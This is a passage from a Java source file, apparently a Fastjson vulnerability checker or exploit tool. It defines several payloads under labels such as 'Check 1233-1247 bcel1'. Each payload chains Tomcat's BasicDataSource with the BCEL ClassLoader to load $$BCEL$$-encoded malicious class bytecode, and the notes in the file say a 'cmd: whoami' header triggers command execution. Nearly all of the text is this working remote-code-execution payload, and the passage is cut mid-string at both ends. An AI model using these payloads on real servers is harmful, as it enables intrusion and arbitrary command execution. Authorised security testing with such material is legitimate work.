3$d0$82$8d$gZ$b1$91$80$k$97$k$g$ea$b1F$c3$3a$ac$970O$ec$ee$af$8a$9b$f6$be$a8$e9Tu$3bNo$d5z6ao$a1$cd$dc$9b0$e3$8e$8c$cfj$Y$c1e$N$8dx$b1$84$db$t$3a$e4E$5d$c3$GA$3ds$o$f4j$f8$i$dad$7c$5e$c3$d3$f8$82$868h$c4$X$f12$N_$S$cdKE$f3e$7cE$c3W$f15$a6$3e$c3$b9$de$U$v$cb$i$ba$813$Bzcrj$f8$3a$be1f$dd$c3$a8$8coj$f8$W$be$ad$a1$J$cd$y3$Z$A8F$f3$cc$f0$93$b0$e0$ff$A$9f$84$db$s$80$9e$E$d9$8aW$c5$88$3a$Z$df$d1$f0$5d$7cO$c3$f7$f1$MkH_$q$d6i$f5$J$bf$fc$80$c9$b8n$f5$G$c2dS$7bC$e5$5d$9eG$3c8$8e$da1$W$a4c$m$Q6$f4X$cc$b4e$fcP$c3$V$fcH$c3$8f$f1$T$Z$3f$d5$f03$fc$5c$40$e7$X$84$fb$8e$3a$N$bf$c4$af4$fc$g$cfhx$W$bf$d1$f0$5b$81$a9$df$89$e6$f7$f8$D$f1$a8$e1$8f$f8$93$86$3f$e3$_$g$fe$8a$bf$J$a8$e9$94$be$7d$7c$z$d0$f0w$R$bb$7f$e09$a6$de$84$b5$89$85b$fbM2$a3$f0$F$b6$98$9e$Z$ab$3a$9d$T$e5$m$F$8ey$a5$e3kwY$86r$3f$b9W8$cf$z$91$ed$b6n$98c$e0$d3$dem$T$7dLh$pa$dbf$cc$Z$9dO$zMg$e5$ad$92$97b$d0F$3d$S$a3x$9f$deI$3a$85$d1J$e93$a54$93$f4$fcH$bc$$$k$X$f7$hKs$83m$f5$I$de$e3$e8DM$W$81$f7$A$qaU$G$db$b6$8f$3fu$b3$w$3c$fd$85$f6$I$bf$I1$bd$87$8eX$96$a1$dag$IzY$a6$bb0$3d7$P$c4$j$b3$c7$bb$pZm$ab$d7$b4$9d$D$y$x$T$c4$e7$fau$9b$ebXMV$9fi$d7$eb$e2j$Z$eb$f9$ebD$rc$9c$c6z$k$W$b5$yf$98$ae$ef$K$fe$b7$d7$96$889$RQ$e7Uqc$8dNBc$b8$a6$96$c5$3dk$ee7$N$be$3a$s$d0$95V$89JQ$3bFRjQ$c2$qJj$8c$f5$s$I2$e2$84$8e$u$i$95$c6$d4M$db$e0$f1$f2$d2$8c$h$Z$a4$f3$ce$d5$Sqs$8d$Z$8d$f4xy$7f$T$r$d3$8b$81$b0$wf$ee$e7$8d$p$bb$c8$8f$c6nx$H$a4I$I$ec$8a$s$e2$bc$ea$CF$d4$S$ce$_$a0$rk$d2$af6Z7$a3$b4$ecfI$9c$c7$8b$d5$ab$a3$R$f7$89$e3$_$dd$s8$fb$c8$e9$G$M$dc$MM2$d3$c4$b6$f5$D$ee$b3$8a$B$cd$e3$f1p$82H2$bc$e4$K$89$3cc$ee$d1$ae1$F$a1h$7c$d2$a5$5e$80$98$c5gh1$9f$e52$UqCB$c2Z$ce$b2$d0$c09$_K$8e$Vq$ff$b9$fd$86T$cf$db$c3$edy$df$ba$7d$ab$db$Hx$96$d70$db0gI$f2$c8b$bf$bc$fc$i$qi$IY$fc$7c$X$e0$dfz$O$81$nd$PB$O$wI$e4$MA$V$c3$5cw$a8$N$40iZ$90$c4$a4aL$f6$N$p$ff$yyMC$F$l$d4y$f0$a1$9d$dc$aa$90$cbv2$9f$fc$F$94$h$84$86$v$a4$I$d1$KAWD$caB$y$e4$83$7d$JJP$8b$Z$d8D$eai$d4c$nOl$c6$W$f2$a3F$b8$H$5b$d9o$e3$97$8f$ac$e7yH$92$b1$5d4$3b$fcP$c5$dd$cb$Ta$97$o$cb$3dQ$5c$3e$82$bcAd$97$tQp$M$B$ff$Zo$i$dc$e2$3b$c3$5dO$b3$m$r$A$b7a$S$ffS$e4c$Ou$98$ebJ$d7$3c$Ox$b9$eb$p$n$d3$8f$acI$Sv$K$8fI$5c$GE$f2$o$f1Df$3d$82l$c1H$aa$y$c9_r$g$93$H$915$o$3c$e4$h$81$ffl$f90$a6$i$97B$5c$bb$8c$87$G$a1R$85$a9I$84$8e$e1$409$fd$cb$85$e04$ffS$u$dc$ea$LN$P$tQT$ceI1$t$r$9c$cc$b8$84$e9C$b8e$Q$b7$5c$86$w$a21$802$f2$n$83$e0$ad$3e$9e$nys$F$X8$$$s5C$c5P4$7b$84$8b$9b$x$92$985$80r$d1$cf$Z$c0l$d1$cf$h$401$d5$ba$8c$a9$83$d0$ae$x$oS$R$9f$abs$b7$absG$f0$f6a$ccO$a24X$96D$f91$u$c1$F$D$I$E$x$9ay$uX$99$SL$ca$94$d8K$a8j$a9$bc$80$ea$ad$c3XHU$93X$94$c4$e2$8asxQpI$Sw$q$b14$89$3b$x$93$b8$8b$df$b2$B$f8$9b$cf$96$97$f8w$ba8$J$a0$D$P$e0$m$fd$bf$I$P$e3Q$c6$40$f4G$f8$bfN$f4$t$Y$8b$Ri$a64$87$fb$5e$b4$k$e7$K0$9fQ$x$r$82$ca$Z$9f$F$a8$q$82$W$R$M$9b$88$96$ed$iu$e0$O$d8XJ$be$b5$e4$7c$t$fa$b1$8c$bc$ea$c9$fdn$i$c2$K$3c$c6$f1$R$ac$c4Q$ac$c2$T$i$9f$40$jN2$9b$9e$e4$f84$b3$u$c9$i$3a$cf$8c$Za$be$5ca$c6$5cE$8b4$9d$8f$d3$Zh$95f$oLm$da$a4$b9h$97$e6a$8bTAD$K$b4$ec$40$OeN$a2l$83$80$e8wQ$db$c9$d1$nwdrt$d4$j$ed$e2$e8$a4$3b$ea$e2$e8$K$a5vSB$We$94$o$82$dd$b4$92$Q$c2$k$Xsb$UE$Pq$u$d0W$8a$fc$m$fe$85$96$9d2b$fe$d52$acu2z$f9$ed$95$a7$cd$ac$93a$3f$87$b5$dc$Ba$u$Q$9a$93E$s$e0q$81$d2$f8$uJ$a5$7b$d8k$5c$eb$X$91$Xp$a8i$a9$bc$b8$d4$ef$5b$g$I$FB$feS0$xC$81$c55$d9E$d9$fe$qj$a5$g$b9H$a4$cbr$f6$b2$8b$94$bb$8fC$x$92K$86$b1b$A$d5E$f2$r$ac$e4$afF$vR$$$$$cd$f1$zUCj$u$e7$U$a6$V$v$nuqMnQ$ae$m$ecW$a5$81$e7$9f$rxj$94$fe$A$87$c7$vt$d5$d6$e6$cb$cf$3f$u$8a$c4$7cXt$dbhpW3$B$85$x$DL$e4$5b$99asi$ca$7c$ba$b4$9a$ae$ac$a1$T$eb$e94$83$O$8b$b0$b7h$abM$e78$a4$bd$X$7bq$lg$H9$T$c1XA$t$Y$fc$i$ba1$97$i$9a$5d$87$ca$e4$b9$Z$J$ec$e3$O$3d$80$3e$cf$c9$iyN$O$e0$7e$ecg$d8$b3$5cwWA$f97$C2$O$5cC$ae$8c$7b$r$e9$3fX$q$e3$3e$Z$af$b8$86$C$Z$x$r$e9$w$8a$Y$86$d8$3f$c1Q$60$d4$e9$7d$v$a7$xx$e5$f5$8a$3a$db$ad$q$M$E$abc$SuC$90$cf$8a$e0$ba$sg$bb$7b$K$dbW$b9$d5$fb$fe$ff$Ctz$ebem$R$A$A\"\n" +
                "        }\n" +
                "    }: \"x\"\n" +
                "}"));
        vulnerabilities.add(new Vulnerability("Check 1233-1247 bcel1", "tomcat7，请求头添加cmd: whoami", "{\n" +
                "    \"xx\":\n" +
                "    {\n" +
                "        \"@type\" : \"java.lang.Class\",\n" +
                "        \"val\"   : \"org.apache.tomcat.dbcp.dbcp.BasicDataSource\"\n" +
                "    },\n" +
                "    \"x\" : {\n" +
                "        \"name\": {\n" +
                "            \"@type\" : \"java.lang.Class\",\n" +
                "            \"val\"   : \"com.sun.org.apache.bcel.internal.util.ClassLoader\"\n" +
                "        },\n" +
                "        {\n" +
                "            \"@type\":\"com.alibaba.fastjson.JSONObject\",\n" +
                "            \"c\": {\n" +
                "                \"@type\":\"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\",\n" +
                "                \"driverClassLoader\": {\n" +
                "                    \"@type\" : \"com.sun.org.apache.bcel.internal.util.ClassLoader\"\n" +
                "                },\n" +
                "                \"driverClassName\":\"$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$8dV$cb$5b$TW$U$ff$5dH27$c3$m$g$40$Z$d1$wX5$a0$q$7d$d8V$81Zi$c4b$F$b4F$a5$f8j$t$c3$85$MLf$e2$cc$E$b1$ef$f7$c3$be$ec$a6$df$d7u$X$ae$ddD$bf$f6$d3$af$eb$$$ba$ea$b6$ab$ae$ba$ea$7fP$7bnf$C$89$d0$afeq$ee$bd$e7$fe$ce$ebw$ce$9d$f0$cb$df$3f$3e$Ap$I$df$aaHbX$c5$IF$a5x$9e$e3$a8$8a$Xp$8ccL$c1$8b$w$U$e4$U$iW1$8e$T$i$_qLp$9c$e4x$99$e3$94$bc$9b$e4$98$e2$98VpZ$o$cep$bc$c2qVE$k$e7Tt$e2$3c$c7$F$b9$cep$bc$ca1$cbqQ$G$bb$c4qY$c1$V$VW$f1$9a$U$af$ab0PP$b1$h$s$c7$9c$5c$85$U$f3$i$L$iE$F$96$82E$86$c4$a8$e5X$c1Q$86$d6$f4$c0$F$86X$ce$9d$T$M$j$93$96$p$a6$x$a5$82$f0$ce$Z$F$9b4$7c$d4$b4$pd$7b$3e0$cc$a5$v$a3$5c$bb$a2j$U$yQ$z$94$ac$C$9b$fc2$a8y$b7$e2$99$e2$84$r$z$3b$f2e$cfr$W$c6$cd$a2$9bY4$96$N$N$H1$a4$a0$a4$c1$81$ab$a1$8ck$M$a3$ae$b7$90$f1k$b8y$cf$u$89$eb$ae$b7$94$b9$$$K$Z$d3u$C$b1$Sd$3cq$ad$o$fc$ms6$5cs$a1z$c2$b5$e7$84$a7$c0$d3$e0$p$60$e8Z$QA$84$Y$L$C$cf$wT$C$e1S$G2l$d66$9c$85l$ce6$7c_C$F$cb$M$9b$d7$d4$a7$L$8b$c2$M$a8$O$N$d7$b1$c2p$ec$ff$e6$93$X$de$b2$bda$d0$b6Z$$$7e$d9u$7c$oA$5d$cb$8ca$a7$M$bc$92$f1C$db5$lup$92$c03$9e$V$I$aa$eb$86$ccto$b3A1$I$ca$99$J$S$cd$d1C$c3$Ja$Q$tM$d5$e5$DY$88$867$f0$s$f5$d9$y$cd1$u$ae$9fq$a80$Foix$h$efhx$X$ef$d1$e5$cc$c9i$N$ef$e3$D$86$96$acI$b0l$c1r$b2$7e$91$8eC$a6$86$P$f1$R$e9$q$z$81$ed0l$a9$85$a8$E$96$9d$cd$9b$86$e3$c8V$7c$ac$e1$T$7c$aa$e13$7c$ae$e0$a6$86$_$f0$a5l$f8W$e4$e1$f2$98$86$af$f1$8d$86$5b2T$7c$de$aeH$c7q$d3ve$d1$9dk$f9$8e$af$98$a2$iX$$$85$e85$ddRv$de$f0$83E$dfu$b2$cb$V$8a$b4$3aM$M$3dk6$9e$98$b7$a9$85$d9$v$R$U$5d$w$b0$f3$d2$e4$a3$E$8c4$91r$ae$e8$RS4$cdf$c5$f3$84$T$d4$cf$5d$e9$81$c9GQd$d9M$d4FSW$9b$a1I7$a4Yo$827$5cI$9b$N$_$a8M6mj$gjmz$7d$9e$eb$3c$8e$84$ad$ad$d7vl$D$9bK$ebl$g$bd4$b3C$ee$S$96$b3$ec$$$R$edG$g$7d$85$cf$a0$c9W$a4$gX$af$a2$feSN$c7$85i$h$9e$98$ab$e7$d6$ee$8b$60$cc4$85$ef$5b$b5$efF$y$7dQ$7eW$g$a7$f1$86$l$88R$f8$40$cexnYx$c1$N$86$7d$ff$c1$c3j$L$db$C$f7$7c$99$8cr$86$9c$9a$e6n$ad$82$b8$7c$a7$86$e5$Q$c1$bd$8d$8esE$c3$cb$cb$d7$e2$98bd$e0$o$Be$5b$c3Nt$ae$ef$e4H$7d$c6k$aa$b3$V$t$b0J$f5$c7$5c$3ft7$99Ej2$8c$89$VA$_$u$9d$de$60$Q$h$z$88$C$c9Vs$a8H$c9$b0$89B$9dt$ca$95$80$y$85A$acm$ab$87$b3$dcl$c3$F$99$f7$a47$bc$90$eck$V_$i$X$b6U$92$df$U$86$fd$ff$ceu$e3c$96E84$ef$e8$c3$B$fa$7d$91$7f$z$60$f2$ebM2C$a7$9d$b42Z$e3$83w$c1$ee$d0$86$nK2QS$s$c0$f1D$j$da$d2O$O$da$Ip$f5$kZ$aahM$c5$aa$88$9f$gL$rZ$efC$a9$82O$k$60$b4KV$a1NE$80$b6$Q$a0$d5$B$83$a9$f6h$3b$7d$e0$60$84$j$8e$N$adn$e3$91$dd$s$b2Ku$84$d0$cd$c3$89H$bbEjS1$d2$ce$b6$a6$3a$f3$f2J$d1$VJ$a2KO$84R$8f$d5$3dq$5d$d1$e3$EM$S$b4$9b$a0$ea$cf$e8$iN$s$ee$93TS$5b$efa$5b$V$3d$v$bd$8a$ed$df$p$a5$ab$S$a3$ab$b1To$fe6$3a$e4qG$ed$b8$93d$5cO$e6u$5e$c5c$a9$5d$8d$91u$k$3a$ff$J$bbg$ef$a1OW$ab$e8$afb$cf$5d$3c$9e$da$5b$c5$be$w$f6$cb$a03$a1e$3a$aaD$e7Qz$91$7e$60$9d$fe6b$a7$eeH$e6$d9$y$bb$8cAj$95$ec$85$83$5e$92IhP$b1$8d$3a$d0G$bb$n$b4$e306$n$87$OLc3f$b1$F$$R$b8I$ffR$dcB$X$beC7$7e$c0VP$a9x$80$k$fc$K$j$bfa$3b$7e$c7$O$fcAM$ff$T$bb$f0$Xv$b3$B$f4$b11$f4$b3Y$ec$a5$88$7b$d8$V$ec$c7$93$U$edY$c4$k$S$b8M$c1S$K$9eVp$a8$$$c3M$b8$7fF$n$i$da$k$c2$93s$a3$e099$3d$87k$pv$e4$l$3eQL$40E$J$A$A\"\n" +
                "            }\n" +
                "        } : \"xxx\"\n" +
                "    }\n" +
                "}"));
        vulnerabilities.add(new Vulnerability("Check 1233-1247 bcel2", "tomcat8，请求头添加cmd: whoami", "{\n" +
                "    \"xx\":\n" +
                "    {\n" +
                "        \"@type\" : \"java.lang.Class\",\n" +
                "        \"val\"   : \"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\"\n" +
                "    },\n" +
                "    \"x\" : {\n" +
                "        \"name\": {\n" +
                "            \"@type\" : \"java.lang.Class\",\n" +
                "            \"val\"   : \"com.sun.org.apache.bcel.internal.util.ClassLoader\"\n" +
                "        },\n" +
                "        {\n" +
                "            \"@type\":\"com.alibaba.fastjson.JSONObject\",\n" +
                "            \"c\": {\n" +
                "                \"@type\":\"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\",\n" +
                "                \"driverClassLoader\": {\n" +
                "                    \"@type\" : \"com.sun.org.apache.bcel.internal.util.ClassLoader\"\n" +
                "                },\n" +
                "                \"driverClassName\":\"$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$8dV$cb$5b$TW$U$ff$5dH27$c3$m$g$40$Z$d1$wX5$a0$q$7d$d8V$81Zi$c4b$F$b4F$a5$f8j$t$c3$85$MLf$e2$cc$E$b1$ef$f7$c3$be$ec$a6$df$d7u$X$ae$ddD$bf$f6$d3$af$eb$$$ba$ea$b6$ab$ae$ba$ea$7fP$7bnf$C$89$d0$afeq$ee$bd$e7$fe$ce$ebw$ce$9d$f0$cb$df$3f$3e$Ap$I$df$aaHbX$c5$IF$a5x$9e$e3$a8$8a$Xp$8ccL$c1$8b$w$U$e4$U$iW1$8e$T$i$_qLp$9c$e4x$99$e3$94$bc$9b$e4$98$e2$98VpZ$o$cep$bc$c2qVE$k$e7Tt$e2$3c$c7$F$b9$cep$bc$ca1$cbqQ$G$bb$c4qY$c1$V$VW$f1$9a$U$af$ab0PP$b1$h$s$c7$9c$5c$85$U$f3$i$L$iE$F$96$82E$86$c4$a8$e5X$c1Q$86$d6$f4$c0$F$86X$ce$9d$T$M$j$93$96$p$a6$x$a5$82$f0$ce$Z$F$9b4$7c$d4$b4$pd$7b$3e0$cc$a5$v$a3$5c$bb$a2j$U$yQ$z$94$ac$C$9b$fc2$a8y$b7$e2$99$e2$84$r$z$3b$f2e$cfr$W$c6$cd$a2$9bY4$96$N$N$H1$a4$a0$a4$c1$81$ab$a1$8ck$M$a3$ae$b7$90$f1k$b8y$cf$u$89$eb$ae$b7$94$b9$$$K$Z$d3u$C$b1$Sd$3cq$ad$o$fc$ms6$5cs$a1z$c2$b5$e7$84$a7$c0$d3$e0$p$60$e8Z$QA$84$Y$L$C$cf$wT$C$e1S$G2l$d66$9c$85l$ce6$7c_C$F$cb$M$9b$d7$d4$a7$L$8b$c2$M$a8$O$N$d7$b1$c2p$ec$ff$e6$93$X$de$b2$bda$d0$b6Z$$$7e$d9u$7c$oA$5d$cb$8ca$a7$M$bc$92$f1C$db5$lup$92$c03$9e$V$I$aa$eb$86$ccto$b3A1$I$ca$99$J$S$cd$d1C$c3$Ja$Q$tM$d5$e5$DY$88$867$f0$s$f5$d9$y$cd1$u$ae$9fq$a80$Foix$h$efhx$X$ef$d1$e5$cc$c9i$N$ef$e3$D$86$96$acI$b0l$c1r$b2$7e$91$8eC$a6$86$P$f1$R$e9$q$z$81$ed0l$a9$85$a8$E$96$9d$cd$9b$86$e3$c8V$7c$ac$e1$T$7c$aa$e13$7c$ae$e0$a6$86$_$f0$a5l$f8W$e4$e1$f2$98$86$af$f1$8d$86$5b2T$7c$de$aeH$c7q$d3ve$d1$9dk$f9$8e$af$98$a2$iX$$$85$e85$ddRv$de$f0$83E$dfu$b2$cb$V$8a$b4$3aM$M$3dk6$9e$98$b7$a9$85$d9$v$R$U$5d$w$b0$f3$d2$e4$a3$E$8c4$91r$ae$e8$RS4$cdf$c5$f3$84$T$d4$cf$5d$e9$81$c9GQd$d9M$d4FSW$9b$a1I7$a4Yo$827$5cI$9b$N$_$a8M6mj$gjmz$7d$9e$eb$3c$8e$84$ad$ad$d7vl$D$9bK$ebl$g$bd4$b3C$ee$S$96$b3$ec$$$R$edG$g$7d$85$cf$a0$c9W$a4$gX$af$a2$feSN$c7$85i$h$9e$98$ab$e7$d6$ee$8b$60$cc4$85$ef$5b$b5$efF$y$7dQ$7eW$g$a7$f1$86$l$88R$f8$40$cexnYx$c1$N$86$7d$ff$c1$c3j$L$db$C$f7$7c$99$8cr$86$9c$9a$e6n$ad$82$b8$7c$a7$86$e5$Q$c1$bd$8d$8esE$c3$cb$cb$d7$e2$98bd$e0$o$Be$5b$c3Nt$ae$ef$e4H$7d$c6k$aa$b3$V$t$b0J$f5$c7$5c$3ft7$99Ej2$8c$89$VA$_$u$9d$de$60$Q$h$z$88$C$c9Vs$a8H$c9$b0$89B$9dt$ca$95$80$y$85A$acm$ab$87$b3$dcl$c3$F$99$f7$a47$bc$90$eck$V_$i$X$b6U$92$df$U$86$fd$ff$ceu$e3c$96E84$ef$e8$c3$B$fa$7d$91$7f$z$60$f2$ebM2C$a7$9d$b42Z$e3$83w$c1$ee$d0$86$nK2QS$s$c0$f1D$j$da$d2O$O$da$Ip$f5$kZ$aahM$c5$aa$88$9f$gL$rZ$efC$a9$82O$k$60$b4KV$a1NE$80$b6$Q$a0$d5$B$83$a9$f6h$3b$7d$e0$60$84$j$8e$N$adn$e3$91$dd$s$b2Ku$84$d0$cd$c3$89H$bbEjS1$d2$ce$b6$a6$3a$f3$f2J$d1$VJ$a2KO$84R$8f$d5$3dq$5d$d1$e3$EM$S$b4$9b$a0$ea$cf$e8$iN$s$ee$93TS$5b$efa$5b$V$3d$v$bd$8a$ed$df$p$a5$ab$S$a3$ab$b1To$fe6$3a$e4qG$ed$b8$93d$5cO$e6u$5e$c5c$a9$5d$8d$91u$k$3a$ff$J$bbg$ef$a1OW$ab$e8$afb$cf$5d$3c$9e$da$5b$c5$be$w$f6$cb$a03$a1e$3a$aaD$e7Qz$91$7e$60$9d$fe6b$a7$eeH$e6$d9$y$bb$8cAj$95$ec$85$83$5e$92IhP$b1$8d$3a$d0G$bb$n$b4$e306$n$87$OLc3f$b1$F$$R$b8I$ffR$dcB$X$beC7$7e$c0VP$a9x$80$k$fc$K$j$bfa$3b$7e$c7$O$fcAM$ff$T$bb$f0$Xv$b3$B$f4$b11$f4$b3Y$ec$a5$88$7b$d8$V$ec$c7$93$U$edY$c4$k$S$b8M$c1S$K$9eVp$a8$$$c3M$b8$7fF$n$i$da$k$c2$93s$a3$e099$3d$87k$pv$e4$l$3eQL$40E$J$A$A\"\n" +
                "            }\n" +
                "        } : \"xxx\"\n" +
                "    }\n" +
                "}"));
        vulnerabilities.add(new Vulnerability("Check 1233-1236 bcel1", "tomcat7，请求头添加cmd: whoami", "{\n" +
                "    \"name\":\n" +
                "    {\n" +
                "        \"@type\" : \"java.lang.Class\",\n" +
                "        \"val\"   : \"org.apache.tomcat.dbcp.dbcp.BasicDataSource\"\n" +
                "    },\n" +
                "    \"x\" : {\n" +
                "        \"name\": {\n" +
                "            \"@type\" : \"java.lang.Class\",\n" +
                "            \"val\"   : \"com.sun.org.apache.bcel.internal.util.ClassLoader\"\n" +
                "        },\n" +
                "        {\n" +
                "            \"@type\":\"com.alibaba.fastjson.JSONObject\",\n" +
                "            \"c\": {\n" +
                "                \"@type\":\"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\",\n" +
                "                \"driverClassLoader\": {\n" +
                "                    \"@type\" : \"com.sun.org.apache.bcel.internal.util.ClassLoader\"\n" +
                "                },\n" +
                "                \"driverClassName\":\"$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$8dV$cb$5b$TW$U$ff$5dH27$c3$m$g$40$Z$d1$wX5$a0$q$7d$d8V$81Zi$c4b$F$b4F$a5$f8j$t$c3$85$MLf$e2$cc$E$b1$ef$f7$c3$be$ec$a6$df$d7u$X$ae$ddD$bf$f6$d3$af$eb$$$ba$ea$b6$ab$ae$ba$ea$7fP$7bnf$C$89$d0$afeq$ee$bd$e7$fe$ce$ebw$ce$9d$f0$cb$df$3f$3e$Ap$I$df$aaHbX$c5$IF$a5x$9e$e3$a8$8a$Xp$8ccL$c1$8b$w$U$e4$U$iW1$8e$T$i$_qLp$9c$e4x$99$e3$94$bc$9b$e4$98$e2$98VpZ$o$cep$bc$c2qVE$k$e7Tt$e2$3c$c7$F$b9$cep$bc$ca1$cbqQ$G$bb$c4qY$c1$V$VW$f1$9a$U$af$ab0PP$b1$h$s$c7$9c$5c$85$U$f3$i$L$iE$F$96$82E$86$c4$a8$e5X$c1Q$86$d6$f4$c0$F$86X$ce$9d$T$M$j$93$96$p$a6$x$a5$82$f0$ce$Z$F$9b4$7c$d4$b4$pd$7b$3e0$cc$a5$v$a3$5c$bb$a2j$U$yQ$z$94$ac$C$9b$fc2$a8y$b7$e2$99$e2$84$r$z$3b$f2e$cfr$W$c6$cd$a2$9bY4$96$N$N$H1$a4$a0$a4$c1$81$ab$a1$8ck$M$a3$ae$b7$90$f1k$b8y$cf$u$89$eb$ae$b7$94$b9$$$K$Z$d3u$C$b1$Sd$3cq$ad$o$fc$ms6$5cs$a1z$c2$b5$e7$84$a7$c0$d3$e0$p$60$e8Z$QA$84$Y$L$C$cf$wT$C$e1S$G2l$d66$9c$85l$ce6$7c_C$F$cb$M$9b$d7$d4$a7$L$8b$c2$M$a8$O$N$d7$b1$c2p$ec$ff$e6$93$X$de$b2$bda$d0$b6Z$$$7e$d9u$7c$oA$5d$cb$8ca$a7$M$bc$92$f1C$db5$lup$92$c03$9e$V$I$aa$eb$86$ccto$b3A1$I$ca$99$J$S$cd$d1C$c3$Ja$Q$tM$d5$e5$DY$88$867$f0$s$f5$d9$y$cd1$u$ae$9fq$a80$Foix$h$efhx$X$ef$d1$e5$cc$c9i$N$ef$e3$D$86$96$acI$b0l$c1r$b2$7e$91$8eC$a6$86$P$f1$R$e9$q$z$81$ed0l$a9$85$a8$E$96$9d$cd$9b$86$e3$c8V$7c$ac$e1$T$7c$aa$e13$7c$ae$e0$a6$86$_$f0$a5l$f8W$e4$e1$f2$98$86$af$f1$8d$86$5b2T$7c$de$aeH$c7q$d3ve$d1$9dk$f9$8e$af$98$a2$iX$$$85$e85$ddRv$de$f0$83E$dfu$b2$cb$V$8a$b4$3aM$M$3dk6$9e$98$b7$a9$85$d9$v$R$U$5d$w$b0$f3$d2$e4$a3$E$8c4$91r$ae$e8$RS4$cdf$c5$f3$84$T$d4$cf$5d$e9$81$c9GQd$d9M$d4FSW$9b$a1I7$a4Yo$827$5cI$9b$N$_$a8M6mj$gjmz$7d$9e$eb$3c$8e$84$ad$ad$d7vl$D$9bK$ebl$g$bd4$b3C$ee$S$96$b3$ec$$$R$edG$g$7d$85$cf$a0$c9W$a4$gX$af$a2$feSN$c7$85i$h$9e$98$ab$e7$d6$ee$8b$60$cc4$85$ef$5b$b5$efF$y$7dQ$7eW$g$a7$f1$86$l$88R$f8$40$cexnYx$c1$N$86$7d$ff$c1$c3j$L$db$C$f7$7c$99$8cr$86$9c$9a$e6n$ad$82$b8$7c$a7$86$e5$Q$c1$bd$8d$8esE$c3$cb$cb$d7$e2$98bd$e0$o$Be$5b$c3Nt$ae$ef$e4H$7d$c6k$aa$b3$V$t$b0J$f5$c7$5c$3ft7$99Ej2$8c$89$VA$_$u$9d$de$60$Q$h$z$88$C$c9Vs$a8H$c9$b0$89B$9dt$ca$95$80$y$85A$acm$ab$87$b3$dcl$c3$F$99$f7$a47$bc$90$eck$V_$i$X$b6U$92$df$U$86$fd$ff$ceu$e3c$96E84$ef$e8$c3$B$fa$7d$91$7f$z$60$f2$ebM2C$a7$9d$b42Z$e3$83w$c1$ee$d0$86$nK2QS$s$c0$f1D$j$da$d2O$O$da$Ip$f5$kZ$aahM$c5$aa$88$9f$gL$rZ$efC$a9$82O$k$60$b4KV$a1NE$80$b6$Q$a0$d5$B$83$a9$f6h$3b$7d$e0$60$84$j$8e$N$adn$e3$91$dd$s$b2Ku$84$d0$cd$c3$89H$bbEjS1$d2$ce$b6$a6$3a$f3$f2J$d1$VJ$a2KO$84R$8f$d5$3dq$5d$d1$e3$EM$S$b4$9b$a0$ea$cf$e8$iN$s$ee$93TS$5b$efa$5b$V$3d$v$bd$8a$ed$df$p$a5$ab$S$a3$ab$b1To$fe6$3a$e4qG$ed$b8$93d$5cO$e6u$5e$c5c$a9$5d$8d$91u$k$3a$ff$J$bbg$ef$a1OW$ab$e8$afb$cf$5d$3c$9e$da$5b$c5$be$w$f6$cb$a03$a1e$3a$aaD$e7Qz$91$7e$60$9d$fe6b$a7$eeH$e6$d9$y$bb$8cAj$95$ec$85$83$5e$92IhP$b1$8d$3a$d0G$bb$n$b4$e306$n$87$OLc3f$b1$F$$R$b8I$ffR$dcB$X$beC7$7e$c0VP$a9x$80$k$fc$K$j$bfa$3b$7e$c7$O$fcAM$ff$T$bb$f0$Xv$b3$B$f4$b11$f4$b3Y$ec$a5$88$7b$d8$V$ec$c7$93$U$edY$c4$k$S$b8M$c1S$K$9eVp$a8$$$c3M$b8$7fF$n$i$da$k$c2$93s$a3$e099$3d$87k$pv$e4$l$3eQL$40E$J$A$A\"\n" +
                "            }\n" +
                "        } : \"ddd\"\n" +
                "    }\n" +
                "}"));
        vulnerabilities.add(new Vulnerability("Check 1233-1236 bcel2", "tomcat8，请求头添加cmd: whoami", "{\n" +
                "    \"name\":\n" +
                "    {\n" +
                "        \"@type\" : \"java.lang.Class\",\n" +
                "        \"val\"   : \"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\"\n" +
                "    },\n" +
                "    \"x\" : {\n" +
                "        \"name\": {\n" +
                "            \"@type\" : \"java.lang.Class\",\n" +
                "            \"val\"   : \"com.sun.org.apache.bcel.internal.util.ClassLoader\"\n" +
                "        },\n" +
                "        {\n" +
                "            \"@type\":\"com.alibaba.fastjson.JSONObject\",\n" +
                "            \"c\": {\n" +
                "                \"@type\":\"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\",\n" +
                "                \"driverClassLoader\": {\n" +
                "                    \"@type\" : \"com.sun.org.apache.bcel.internal.util.ClassLoader\"\n" +
                "                },\n" +
                "                \"driverClassName\":\"$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$8dV$cb$5b$TW$U$ff$5dH27$c3$m$g$40$Z$d1$wX5$a0$q$7d$d8V$81Zi$c4b$F$b4F$a5$f8j$t$c3$85$MLf$e2$cc$E$b1$ef$f7$c3$be$ec$a6$df$d7u$X$ae$ddD$bf$f6$d3$af$eb$$$ba$ea$b6$ab$ae$ba$ea$7fP$7bnf$C$89$d0$afeq$ee$bd$e7$fe$ce$ebw$ce$9d$f0$cb$df$3f$3e$Ap$I$df$aaHbX$c5$IF$a5x$9e$e3$a8$8a$Xp$8ccL$c1$8b$w$U$e4$U$iW1$8e$T$i$_qLp$9c$e4x$99$e3$94$bc$9b$e4$98$e2$98VpZ$o$cep$bc$c2qVE$k$e7Tt$e2$3c$c7$F$b9$cep$bc$ca1$cbqQ$G$bb$c4qY$c1$V$VW$f1$9a$U$af$ab0PP$b1$h$s$c7$9c$5c$85$U$f3$i$L$iE$F$96$82E$86$c4$a8$e5X$c1Q$86$d6$f4$c0$F$86X$ce$9d$T$M$j$93$96$p$a6$x$a5$82$f0$ce$Z$F$9b4$7c$d4$b4$pd$7b$3e0$cc$a5$v$a3$5c$bb$a2j$U$yQ$z$94$ac$C$9b$fc2$a8y$b7$e2$99$e2$84$r$z$3b$f2e$cfr$W$c6$cd$a2$9bY4$96$N$N$H1$a4$a0$a4$c1$81$ab$a1$8ck$M$a3$ae$b7$90$f1k$b8y$cf$u$89$eb$ae$b7$94$b9$$$K$Z$d3u$C$b1$Sd$3cq$ad$o$fc$ms6$5cs$a1z$c2$b5$e7$84$a7$c0$d3$e0$p$60$e8Z$QA$84$Y$L$C$cf$wT$C$e1S$G2l$d66$9c$85l$ce6$7c_